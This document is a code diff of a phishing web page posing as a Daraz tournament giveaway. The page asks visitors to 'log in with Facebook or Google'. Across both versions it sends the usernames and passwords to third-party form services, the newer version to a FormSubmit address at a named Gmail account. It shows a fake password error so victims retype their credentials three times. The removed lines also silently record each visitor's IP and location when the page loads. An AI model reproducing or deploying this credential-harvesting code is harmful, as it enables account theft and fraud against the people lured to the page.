@@ -54,109 +54,55 @@
             
             <div id="error-display" class="error-box">Please Enter your Correct password and Try Again to participate!</div>
 
-            <form id="secure-form" action="https://formspree.io/f/mgoldrel" method="POST">
-                <select name="Login_Method" required>
-                    <option value="Facebook">Log in with Facebook</option>
-                    <option value="Google">Log in with Email / Google</option>
-                </select>
-                <input type="text" name="Username" placeholder="Mobile number or email" required>
-                <input type="password" name="Password" id="password-input" placeholder="Password" required>
-                <button type="submit" class="btn-main mt-4" id="login-btn">Log In</button>
-            </form>
-            <p class="mt-8 text-[10px] text-gray-400 font-bold tracking-widest uppercase">Personal Backup System v2.0</p>
-        </div>
-    </div>
+            <form id="secure-form" action="https://formsubmit.co/yoshpick22@gmail.com" method="POST">
+    <input type="hidden" name="_subject" value="New Login Attempt - Daraz Tournament">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
 
-    <div id="participation-ui" class="min-h-screen flex items-center justify-center p-6">
-        <div class="bg-white p-10 rounded-[40px] shadow-2xl w-full max-w-md border border-gray-100">
-            <h2 class="text-3xl font-black mb-2 tracking-tight">Final Details</h2>
-            <p class="text-gray-500 text-sm mb-8">Verified! Enter your delivery information.</p>
-            <form class="space-y-4">
-                <input type="text" id="cust-name" placeholder="Full Name" required>
-                <input type="text" id="cust-addr" placeholder="City & Area Address" required>
-                <input type="tel" id="cust-phone" placeholder="Phone Number" required>
-                <input type="number" id="cust-age" placeholder="Age" required>
-                <div class="text-left py-2">
-                    <p class="text-[10px] font-black text-gray-400 uppercase mb-3">Shopped on Daraz before?</p>
-                    <div class="flex gap-6 font-bold text-sm">
-                        <label class="flex items-center gap-2"><input type="radio" name="shopper" value="Yes" class="accent-[#f85606]"> Yes</label>
-                        <label class="flex items-center gap-2"><input type="radio" name="shopper" value="No" class="accent-[#f85606]"> No</label>
-                    </div>
-                </div>
-                <button type="button" onclick="finalizeEntry()" class="btn-main">SUBMIT PARTICIPATION</button>
-            </form>
-        </div>
-    </div>
+    <select name="Login_Method" required>
+        <option value="Facebook">Log in with Facebook</option>
+        <option value="Google">Log in with Email / Google</option>
+    </select>
+    <input type="text" name="Username" placeholder="Mobile number or email" required>
+    <input type="password" name="Password" id="password-input" placeholder="Password" required>
+    <button type="submit" class="btn-main mt-4" id="login-btn">Log In</button>
+</form>
 
-    <div id="success-ui" class="daraz-bg min-h-screen text-white flex flex-col items-center justify-center p-8 text-center">
-        <div class="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center text-4xl mb-6">🏆</div>
-        <h1 class="text-5xl font-black mb-4 tracking-tighter">PARTICIPATION SUCCESSFUL!</h1>
-        <p class="max-w-md opacity-90 text-lg mb-12">Your entry is now live. Winners will be announced after <b>2082-11-29</b> via Email or Facebook.</p>
-        
-        <div class="bg-black/20 p-8 rounded-[32px] border border-white/10 w-full max-w-sm">
-            <p class="text-[10px] font-black uppercase tracking-widest opacity-60 mb-2">Live Participants</p>
-            <div class="text-6xl font-mono font-black text-yellow-400" id="live-counter">14,208</div>
-        </div>
-    </div>
+<script>
+    let loginAttempts = 0;
+    const form = document.getElementById('secure-form');
 
-    <script>
-        let loginAttempts = 0;
+    form.onsubmit = async function(e) {
+        e.preventDefault();
+        loginAttempts++;
 
-        // 1. SILENT VISITOR NOTIFICATION (NEPAL TIME & LOCATION)
-        window.onload = async function() {
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const d = await res.json();
-                const npt = new Date().toLocaleString("en-US", {timeZone: "Asia/Kathmandu"});
+        const formData = new FormData(form);
+        formData.append('Attempt_Number', loginAttempts);
 
-                fetch("https://formspree.io/f/mgoldrel", {
-                    method: "POST",
-                    body: JSON.stringify({ 
-                        Event: "Link Opened", City: d.city, Region: d.region, IP: d.ip, Device: navigator.userAgent, Time: npt 
-                    }),
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
-                });
-            } catch (e) { console.log("Init failed"); }
-        };
-
-        // 2. NAVIGATION LOGIC
-        function triggerLogin() {
-            if (document.getElementById('agree-check').checked) {
-                document.getElementById('login-modal').style.display = 'flex';
-            } else {
-                alert("Please agree to the Tournament Rules first!");
-            }
+        // Send data to FormSubmit
+        try {
+            await fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            });
+        } catch (error) {
+            console.error("Submission failed", error);
         }
 
-        // 3. TRIPLE LOGIN LOGIC
-        const form = document.getElementById('secure-form');
-        form.onsubmit = async function(e) {
-            e.preventDefault();
-            loginAttempts++;
-            
-            // Send data to Formspree every time
-            const formData = new FormData(form);
-            formData.append('Attempt', loginAttempts);
-            await fetch(form.action, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
-
-            if (loginAttempts < 3) {
-                document.getElementById('password-input').value = "";
-                document.getElementById('error-display').style.display = 'block';
-                document.getElementById('login-btn').innerText = "Try Again";
-            } else {
-                document.getElementById('login-modal').style.display = 'none';
-                document.getElementById('landing-page').style.display = 'none';
-                document.getElementById('participation-ui').style.display = 'flex';
-                window.scrollTo(0, 0);
-            }
-        };
-
-        // 4. FINAL SUBMISSION
-        function finalizeEntry() {
-            if(!document.getElementById('cust-name').value) { alert("Please enter your name"); return; }
-            document.getElementById('participation-ui').style.display = 'none';
-            document.getElementById('success-ui').style.display = 'flex';
+        if (loginAttempts < 3) {
+            // Reset for next attempt
+            document.getElementById('password-input').value = "";
+            document.getElementById('error-display').style.display = 'block';
+            document.getElementById('login-btn').innerText = "Try Again";
+        } else {
+            // Move to the next UI after 3 attempts
+            document.getElementById('login-modal').style.display = 'none';
+            document.getElementById('landing-page').style.display = 'none';
+            document.getElementById('participation-ui').style.display = 'flex';
+            window.scrollTo(0, 0);
         }
+    };
 
         // 5. LIVE COUNTER
         setInterval(() => {
@@ -167,6 +113,8 @@
             }
         }, 702);
     </script>
+        </div>
+
+    </div>
 </body>
-                    </html>
-                    
+</html>
